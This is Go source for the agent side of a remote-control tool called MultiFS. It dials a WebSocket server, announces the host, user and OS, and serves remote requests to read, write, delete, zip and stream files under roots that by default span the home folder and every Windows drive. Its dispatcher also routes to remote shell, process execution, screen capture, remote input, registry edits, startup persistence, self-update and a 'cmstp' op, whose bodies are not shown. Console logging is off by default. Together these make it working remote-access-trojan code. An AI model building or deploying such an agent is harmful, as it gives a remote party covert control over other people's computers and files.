//go:build agent
// +build agent

package main

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"multifs-advanced/internal/config"
	"multifs-advanced/internal/protocol"
	"multifs-advanced/internal/wsmini"
)

const agentVersion = config.AgentVersion

// silentLog is a no-op logger for silent background operation.
// Set to true during development for debugging.
const debugMode = false

func dbg(format string, args ...any) {
	if debugMode {
		//nolint
		println(format, args)
	}
}

type safeWS struct {
	c  atomic.Pointer[wsmini.Conn]
	mu sync.Mutex
}

func (s *safeWS) sendJSON(v any) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	c := s.c.Load()
	if c == nil {
		return errors.New("websocket not connected")
	}
	_ = c.SetWriteDeadline(time.Now().Add(15 * time.Second))
	err := c.WriteJSON(v)
	_ = c.SetWriteDeadline(time.Time{})
	return err
}

func (s *safeWS) close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if c := s.c.Swap(nil); c != nil {
		_ = c.Close()
	}
}

type agent struct {
	name  string
	roots []string
	ws    *safeWS
}

func main() {
	server := flag.String("server", config.DefaultAgentServer, "server base URL (ws://host:port)")
	name := flag.String("name", "", "friendly name (default hostname)")
	roots := flag.String("roots", "", "comma-separated allowed roots (default home dir)")
	retry := flag.Duration("retry", 30*time.Second, "reconnect retry interval")
	verbose := flag.Bool("verbose", false, "show detailed agent connection logs")
	quiet := flag.Bool("quiet", false, "suppress minimal console status output")
	installAgent := flag.Bool("install", false, "copy agent into the current user's MultiFS folder and start that copy")
	noInstall := flag.Bool("no-install", false, "do not install or relaunch; kept for backward compatibility")
	flag.Parse()
	if !*verbose {
		log.SetOutput(io.Discard)
		log.SetFlags(0)
	}
	status := func(format string, args ...any) {
		if !*quiet {
			_, _ = fmt.Fprintf(os.Stderr, format+"\n", args...)
		}
	}
	serverFlagSet := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "server" {
			serverFlagSet = true
		}
	})

	// Reliability/safety default: run visibly from the current folder.
	// Installation is now opt-in via -install; this avoids hidden old copies,
	// dropped command-line arguments, and confusing duplicate agents during setup.
	if *installAgent && !*noInstall {
		if maybeInstallAndRelaunch() {
			return
		}
	}

	host, _ := os.Hostname()
	if *name == "" {
		*name = host
	}
	rs, err := parseRoots(*roots)
	if err != nil {
		rs = []string{`.`}
	}

	key := agentKey()
	hdr := http.Header{}
	hdr.Set("X-LFM-Password", resolveAgentPassword())

	var authFailedCount int
	const maxAuthFailures = 5

	log.Printf("MultiFS Agent started visibly as %q on host %q", *name, host)
	log.Printf("Connection order: -server, environment, LAN discovery, agent_config.json, last-good server, local fallback")
	status("MultiFS Full agent running as %q. Reconnect interval: %s. Use -verbose for detailed logs.", *name, retry.String())

	for {
		candidates := resolveAgentServerCandidates(*server, serverFlagSet)
		if len(candidates) == 0 {
			candidates = []agentServerCandidate{{URL: normalizeAgentURL(*server), Source: "local fallback"}}
		}

		connectedThisRound := false
		for _, cand := range candidates {
			u, err := agentWebSocketURL(cand.URL)
			if err != nil {
				log.Printf("invalid server URL %q from %s: %v", cand.URL, cand.Source, err)
				continue
			}
			log.Printf("connecting to %s (%s)", u.String(), cand.Source)
			dbg("agent starting: name=%s host=%s server=%s source=%s", *name, host, u.String(), cand.Source)

			c, resp, err := wsmini.Dial(u.String(), hdr, 10*time.Second)
			if err != nil {
				var authErr *wsmini.AuthError
				if errors.As(err, &authErr) {
					authFailedCount++
					log.Printf("authentication failed at %s (%d/%d); check agent_config.json password", u.String(), authFailedCount, maxAuthFailures)
					if authFailedCount >= maxAuthFailures {
						os.Exit(1)
					}
					continue
				}
				if resp != nil && resp.StatusCode >= 400 {
					log.Printf("server rejected connection at %s: HTTP %d", u.String(), resp.StatusCode)
					continue
				}
				log.Printf("connection failed to %s (%s): %v", u.String(), cand.Source, err)
				continue
			}

			// Reset auth failure count on successful connection.
			authFailedCount = 0
			connectedThisRound = true

			ws := &safeWS{}
			ws.c.Store(c)
			hello := protocol.Hello{
				Type:         "hello",
				Key:          key,
				Name:         *name,
				Hostname:     host,
				OS:           runtime.GOOS,
				Arch:         runtime.GOARCH,
				User:         currentUser(),
				Roots:        rs,
				Version:      agentVersion,
				Build:        "full-go",
				Capabilities: fullAgentCapabilities(),
			}

			if err := ws.sendJSON(hello); err != nil {
				log.Printf("failed to send hello to %s: %v", u.String(), err)
				ws.close()
				connectedThisRound = false
				continue
			}

			rememberAgentServerURL(cand.URL)
			a := &agent{name: *name, roots: rs, ws: ws}
			log.Printf("connected successfully to %s (%s)", u.String(), cand.Source)
			status("MultiFS agent connected to %s", u.Host)
			dbg("connected successfully to server")

			done := make(chan struct{})
			var heartbeatOnce sync.Once
			go func() {
				t := time.NewTicker(60 * time.Second)
				defer t.Stop()
				for {
					select {
					case <-t.C:
						if err := ws.sendJSON(map[string]any{"type": "hb"}); err != nil {
							return
						}
					case <-done:
						return
					}
				}
			}()

			// Read loop. This blocks until the active connection fails, then the outer
			// loop rebuilds the candidate list so a moved server/fallback port can be
			// discovered immediately on the next pass.
			//
			// The 300-second read deadline matches the server side and gives 5×
			// the agent's own 60 s heartbeat interval as headroom. The server
			// also sends its own "hb_srv" envelope every 45 s, so an idle
			// connection should see traffic ~7× per deadline window.
			var readErr error
			for {
				_ = c.SetReadDeadline(time.Now().Add(300 * time.Second))
				_, msg, err := c.ReadMessage()
				if err != nil {
					readErr = err
					break
				}
				_ = c.SetReadDeadline(time.Time{})

				var req protocol.Request
				if err := json.Unmarshal(msg, &req); err != nil || req.Type != "req" || req.ID == "" {
					// Likely a server-side heartbeat ("hb_srv") or a control
					// envelope we don't recognize. Ignore silently — the read
					// already refreshed the deadline.
					continue
				}
				go a.handle(&req)
			}

			// Clean shutdown of this connection.
			heartbeatOnce.Do(func() { close(done) })
			ws.close()
			log.Printf("disconnected from %s: %v; rebuilding server candidate list after %s", u.String(), readErr, retry.String())
			status("MultiFS agent disconnected; retrying in %s", retry.String())
			dbg("disconnected: %v", readErr)
			time.Sleep(*retry)
			break
		}

		if !connectedThisRound {
			log.Printf("all connection candidates failed; retrying in %s", retry.String())
			status("MultiFS agent connection failed; retrying in %s", retry.String())
			time.Sleep(*retry)
		}
	}
}

func currentUser() string {
	u, err := user.Current()
	if err == nil && u != nil {
		return u.Username
	}
	if v := os.Getenv("USERNAME"); v != "" {
		return v
	}
	return os.Getenv("USER")
}

func parseRoots(raw string) ([]string, error) {
	if strings.TrimSpace(raw) == "" {
		if runtime.GOOS == "windows" {
			roots := windowsDefaultRoots()
			if len(roots) > 0 {
				return roots, nil
			}
		}
		home, err := os.UserHomeDir()
		if err != nil {
			return nil, err
		}
		abs, _ := filepath.Abs(home)
		return []string{filepath.Clean(abs)}, nil
	}
	parts := strings.Split(raw, ",")
	var roots []string
	seen := map[string]bool{}
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		abs, err := filepath.Abs(p)
		if err != nil {
			return nil, err
		}
		abs = filepath.Clean(abs)
		key := abs
		if runtime.GOOS == "windows" {
			key = strings.ToLower(key)
		}
		if !seen[key] {
			seen[key] = true
			roots = append(roots, abs)
		}
	}
	return roots, nil
}

func windowsDefaultRoots() []string {
	if runtime.GOOS != "windows" {
		return nil
	}
	roots := []string{}
	seen := map[string]bool{}
	// Put the current user's home first for convenience, then all mounted drive roots.
	if home, err := os.UserHomeDir(); err == nil && strings.TrimSpace(home) != "" {
		if abs, err := filepath.Abs(home); err == nil {
			abs = filepath.Clean(abs)
			seen[strings.ToLower(abs)] = true
			roots = append(roots, abs)
		}
	}
	for ch := 'A'; ch <= 'Z'; ch++ {
		drive := string(ch) + `:\`
		if st, err := os.Stat(drive); err == nil && st.IsDir() {
			key := strings.ToLower(drive)
			if !seen[key] {
				seen[key] = true
				roots = append(roots, drive)
			}
		}
	}
	sort.SliceStable(roots, func(i, j int) bool {
		// Keep the home folder first; sort drive roots alphabetically after it.
		if strings.Contains(roots[i], `:\`) != strings.Contains(roots[j], `:\`) {
			return !strings.HasSuffix(roots[i], `:\`)
		}
		return strings.ToLower(roots[i]) < strings.ToLower(roots[j])
	})
	return roots
}

func (a *agent) allow(p string) (string, error) {
	abs, err := filepath.Abs(p)
	if err != nil {
		return "", err
	}
	abs = filepath.Clean(abs)
	for _, r := range a.roots {
		if within(abs, r) {
			return abs, nil
		}
	}
	return "", os.ErrPermission
}

func within(p, root string) bool {
	p = filepath.Clean(p)
	root = filepath.Clean(root)
	pp := p
	rr := root
	if runtime.GOOS == "windows" {
		pp = strings.ToLower(pp)
		rr = strings.ToLower(rr)
	}
	if pp == rr {
		return true
	}
	sep := string(os.PathSeparator)
	if !strings.HasSuffix(rr, sep) {
		rr += sep
	}
	return strings.HasPrefix(pp, rr)
}

func (a *agent) replyOK(id string, result any) {
	if a.ws == nil {
		return
	}
	resp := protocol.Response{Type: "resp", ID: id, Ok: true, Result: protocol.MustMarshal(result)}
	_ = a.ws.sendJSON(resp)
}

func (a *agent) replyErr(id, msg string) {
	if a.ws == nil {
		return
	}
	resp := protocol.Response{Type: "resp", ID: id, Ok: false, Err: msg}
	_ = a.ws.sendJSON(resp)
}

func (a *agent) handle(req *protocol.Request) {
	defer func() {
		if r := recover(); r != nil {
			a.replyErr(req.ID, "internal error")
		}
	}()

	switch req.Op {
	case "list":
		a.opList(req)
	case "read":
		a.opRead(req)
	case "read_chunk":
		a.opReadChunk(req)
	case "preview":
		a.opPreview(req)
	case "write":
		a.opWrite(req)
	case "mkdir":
		a.opMkdir(req)
	case "rm":
		a.opRemove(req)
	case "rename":
		a.opRename(req)
	case "zip":
		a.opZip(req)
	case "drives":
		a.opDrives(req)
	case "power":
		a.opPower(req)
	case "fun":
		a.opFun(req)
	case "messagebox":
		a.opMessageBox(req)
	case "screen_capture":
		a.opScreenCapture(req)
	case "remote_input":
		a.opRemoteInput(req)
	case "processes":
		a.opProcesses(req)
	case "process_kill":
		a.opProcessKill(req)
	case "process_run":
		a.opProcessRun(req)
	case "registry":
		a.opRegistry(req)
	case "registry_read":
		a.opRegistryRead(req)
	case "shell":
		a.opShell(req)
	case "startup":
		a.opStartup(req)
	case "startup_remove":
		a.opStartupRemove(req)
	case "cmstp":
		a.opCmstp(req)
	case "logs":
		a.opLogs(req)
	case "agent_uninstall":
		a.opAgentUninstall(req)
	case "agent_startup_install":
		a.opAgentStartupInstall(req)
	case "agent_startup_uninstall":
		a.opAgentStartupUninstall(req)
	case "agent_startup_status":
		a.opAgentStartupStatus(req)
	case "agent_close":
		a.opAgentClose(req)
	case "agent_relaunch":
		a.opAgentRelaunch(req)
	case "self_update":
		a.opSelfUpdate(req)
	default:
		a.replyErr(req.ID, "unknown op")
	}
}

func (a *agent) opList(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	des, err := os.ReadDir(abs)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	var out []protocol.DirEntry
	for _, de := range des {
		info, err := de.Info()
		if err != nil {
			continue
		}
		out = append(out, protocol.DirEntry{
			Name:    de.Name(),
			IsDir:   de.IsDir(),
			Size:    info.Size(),
			ModTime: info.ModTime().Unix(),
		})
	}
	a.replyOK(req.ID, protocol.ListResult{Path: abs, Entries: out})
}

func (a *agent) opRead(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	fi, err := os.Stat(abs)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	if fi.IsDir() {
		a.replyErr(req.ID, "is a directory")
		return
	}
	b, err := os.ReadFile(abs)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	a.replyOK(req.ID, protocol.ReadResult{
		Path:    abs,
		DataB64: base64.StdEncoding.EncodeToString(b),
		Size:    fi.Size(),
		ModTime: fi.ModTime().Unix(),
	})
}

// opReadChunk reads a single chunk of a file. Used by the server's /download
// handler to stream very large files without ever buffering them whole on
// either side. The chunk size is bounded by the caller (server picks 4 MiB)
// which keeps base64-inflated payloads well under the WebSocket frame cap
// regardless of how big the underlying file is.
//
// Args (from protocol.Request): Path, Offset, Length.
// Reply: protocol.ReadChunkResult with EOF=true on the final chunk.
func (a *agent) opReadChunk(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	fi, err := os.Stat(abs)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	if fi.IsDir() {
		a.replyErr(req.ID, "is a directory")
		return
	}

	offset := req.Offset
	if offset < 0 {
		offset = 0
	}
	length := req.Length
	const (
		defaultChunk = int64(4 << 20)  // 4 MiB
		maxChunk     = int64(16 << 20) // 16 MiB hard cap per call
	)
	if length <= 0 {
		length = defaultChunk
	}
	if length > maxChunk {
		length = maxChunk
	}

	f, err := os.Open(abs)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	defer f.Close()

	if offset > 0 {
		if _, err := f.Seek(offset, io.SeekStart); err != nil {
			a.replyErr(req.ID, err.Error())
			return
		}
	}

	buf := make([]byte, length)
	n, readErr := io.ReadFull(f, buf)
	eof := false
	switch readErr {
	case nil:
		// Filled the whole chunk; might still be at EOF if file size matches.
		if offset+int64(n) >= fi.Size() {
			eof = true
		}
	case io.EOF, io.ErrUnexpectedEOF:
		eof = true
	default:
		a.replyErr(req.ID, readErr.Error())
		return
	}

	a.replyOK(req.ID, protocol.ReadChunkResult{
		Path:    abs,
		DataB64: base64.StdEncoding.EncodeToString(buf[:n]),
		Offset:  offset,
		Bytes:   n,
		Size:    fi.Size(),
		ModTime: fi.ModTime().Unix(),
		EOF:     eof,
	})
}

func (a *agent) opPreview(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	f, err := os.Open(abs)
	if err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	defer f.Close()

	max := req.MaxBytes
	if max <= 0 || max > 256*1024 {
		max = 64 * 1024
	}
	buf := make([]byte, max+1)
	n, _ := io.ReadFull(f, buf)
	if n < 0 {
		n = 0
	}
	trunc := n > max
	if trunc {
		n = max
	}
	a.replyOK(req.ID, protocol.PreviewResult{Path: abs, Content: string(buf[:n]), Truncated: trunc})
}

func (a *agent) opWrite(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.DataB64)
	if err != nil {
		a.replyErr(req.ID, "bad base64")
		return
	}
	if req.Mkdirs {
		_ = os.MkdirAll(filepath.Dir(abs), 0o755)
	}
	if err := os.WriteFile(abs, data, 0o644); err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{"path": abs, "written": len(data)})
}

func (a *agent) opMkdir(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	if req.Mkdirs {
		if err := os.MkdirAll(abs, 0o755); err != nil {
			a.replyErr(req.ID, err.Error())
			return
		}
	} else {
		if err := os.Mkdir(abs, 0o755); err != nil {
			a.replyErr(req.ID, err.Error())
			return
		}
	}
	a.replyOK(req.ID, map[string]any{"path": abs})
}

func (a *agent) opRemove(req *protocol.Request) {
	abs, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "path not allowed")
		return
	}
	var e error
	if req.Recursive {
		e = os.RemoveAll(abs)
	} else {
		e = os.Remove(abs)
	}
	if e != nil {
		a.replyErr(req.ID, e.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{"path": abs})
}

func (a *agent) opRename(req *protocol.Request) {
	from, err := a.allow(req.Path)
	if err != nil {
		a.replyErr(req.ID, "from not allowed")
		return
	}
	to, err := a.allow(req.Path2)
	if err != nil {
		a.replyErr(req.ID, "to not allowed")
		return
	}
	if err := os.Rename(from, to); err != nil {
		a.replyErr(req.ID, err.Error())
		return
	}
	a.replyOK(req.ID, map[string]any{"from": from, "to": to})
}

func (a *agent) opDrives(req *protocol.Request) {
	out := []protocol.Drive{}
	for _, r := range a.roots {
		label := r
		if runtime.GOOS == "windows" {
			rr := strings.TrimRight(r, "\\/")
			if len(rr) == 2 && rr[1] == ':' {
				label = rr[:2]
			} else if base := filepath.Base(rr); base != "" && base != "." && base != string(filepath.Separator) {
				label = base
			}
		}
		out = append(out, protocol.Drive{Label: label, Path: r})
	}
	a.replyOK(req.ID, protocol.DrivesResult{Drives: out})
}

func (a *agent) opZip(req *protocol.Request) {
	if len(req.Paths) == 0 {
		a.replyErr(req.ID, "no paths")
		return
	}
	absPaths := make([]string, 0, len(req.Paths))
	for _, p := range req.Paths {
		abs, err := a.allow(p)
		if err != nil {
			a.replyErr(req.ID, "path not allowed: "+p)
			return
		}
		absPaths = append(absPaths, abs)
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	addFile := func(full string, zipName string, info os.FileInfo) error {
		h, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		h.Name = zipName
		if info.IsDir() {
			if !strings.HasSuffix(h.Name, "/") {
				h.Name += "/"
			}
		} else {
			h.Method = zip.Deflate
		}
		w, err := zw.CreateHeader(h)
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		f, err := os.Open(full)
		if err != nil {
			return err
		}
		defer f.Close()
		_, err = io.Copy(w, f)
		return err
	}

	for _, root := range absPaths {
		fi, err := os.Stat(root)
		if err != nil {
			_ = zw.Close()
			a.replyErr(req.ID, err.Error())
			return
		}
		baseName := filepath.Base(root)
		baseName = strings.ReplaceAll(baseName, "\\", "/")

		if fi.IsDir() {
			filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
				if err != nil || info == nil {
					return nil
				}
				rel, _ := filepath.Rel(root, p)
				rel = filepath.ToSlash(rel)
				zipName := baseName
				if rel != "." {
					zipName = baseName + "/" + rel
				}
				_ = addFile(p, zipName, info)
				return nil
			})
		} else {
			_ = addFile(root, baseName, fi)
		}
	}

	_ = zw.Close()
	zb := buf.Bytes()

	a.replyOK(req.ID, protocol.ReadResult{
		Path:    "zip",
		DataB64: base64.StdEncoding.EncodeToString(zb),
		Size:    int64(len(zb)),
		ModTime: time.Now().Unix(),
	})
}

func agentKey() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return "host:" + mustHostname()
	}
	p := filepath.Join(home, ".multifs_agent_id")
	if b, err := os.ReadFile(p); err == nil {
		v := strings.TrimSpace(string(b))
		if len(v) >= 12 {
			return v
		}
	}
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err == nil {
		id := hex.EncodeToString(buf)
		_ = os.WriteFile(p, []byte(id+"\n"), 0o600)
		return id
	}
	return "host:" + mustHostname()
}

func mustHostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}
